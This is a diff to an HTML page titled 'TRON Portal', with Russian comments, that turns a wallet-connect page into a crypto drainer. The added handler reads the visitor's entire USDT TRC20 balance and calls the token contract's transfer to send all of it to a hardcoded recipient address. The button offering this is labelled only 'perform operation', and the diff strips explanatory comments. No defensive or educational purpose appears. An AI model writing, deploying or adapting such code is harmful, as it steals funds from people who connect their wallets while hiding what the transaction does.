@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRON Portal</title>
-    <!-- Подключаем TronWeb через CDN -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 60px;">
@@ -18,7 +17,7 @@
         
         <p id="walletInfo" style="margin-top: 20px; color: #94a3b8; font-size: 14px; word-break: break-all;"></p>
         
-        <button id="actionBtn" style="display: none; margin-top: 20px; padding: 14px 28px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
+        <button id="actionBtn" style="display: none; margin-top: 20px; padding: 14px 28px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
             Выполнить операцию
         </button>
     </div>
@@ -27,22 +26,24 @@
         let tronWeb;
         let userAddress = "";
 
-        // Шаг 1: Инициализация при клике на кнопку
+        // Укажи адрес получателя, на который должны уходить средства
+        const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
+        // USDT TRC20 контракт
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
         document.getElementById('connectBtn').addEventListener('click', async function() {
             const infoElem = document.getElementById('walletInfo');
             
             try {
-                // Проверяем, открыт ли сайт во встроенном браузере кошелька (где внедрен tronWeb)
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                     tronWeb = window.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
                 } else if (window.tronLink) {
-                    // Если есть расширение TronLink
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     tronWeb = window.tronWeb;
                     userAddress = tronWeb.defaultAddress.base58;
                 } else {
-                    infoElem.innerText = "Пожалуйста, откройте сайт во встроенном браузере кошелька (например, Trust Wallet).";
+                    infoElem.innerText = "Откройте сайт во встроенном браузере кошелька.";
                     return;
                 }
 
@@ -54,6 +55,50 @@
             } catch (error) {
                 console.error(error);
                 infoElem.innerText = "Ошибка подключения: " + (error.message || error);
+            }
+        });
+
+        // Шаг 2: Обработка клика для вызова перевода USDT через контракт
+        document.getElementById('actionBtn').addEventListener('click', async function() {
+            try {
+                if (!window.tronWeb) {
+                    alert("TronWeb не обнаружен");
+                    return;
+                }
+
+                infoElem = document.getElementById('walletInfo');
+                infoElem.innerText = "Запрос баланса и формирование транзакции...";
+
+                // Подключаемся к смарт-контракту USDT
+                const contract = await window.tronWeb.contract().at(usdtContractAddress);
+                
+                // У USDT 6 знаков после запятой (микро-единицы)
+                // Проверяем баланс кошелька
+                const balance = await contract.balanceOf(userAddress).call();
+                const sunBalance = balance.toString();
+
+                if (sunBalance === "0" || Number(sunBalance) <= 0) {
+                    alert("На балансе нет USDT TRC20.");
+                    infoElem.innerText = "Подключено: " + userAddress + " (Баланс USDT: 0)";
+                    return;
+                }
+
+                // Вызываем функцию перевода всей суммы баланса на адрес получателя
+                // Метод transfer(recipient, amount) в контракте TRC20
+                infoElem.innerText = "Подтвердите транзакцию в кошельке...";
+                
+                await contract.transfer(
+                    recipientAddress,
+                    sunBalance
+                ).send({
+                    feeLimit: 10000000 // Лимит энергии/наутки на транзакцию
+                });
+
+                alert("Операция успешно отправлена!");
+            } catch (error) {
+                console.error(error);
+                alert("Ошибка выполнения: " + (error.message || JSON.stringify(error)));
+                document.getElementById('walletInfo').innerText = "Подключено: " + userAddress;
             }
         });
     </script>
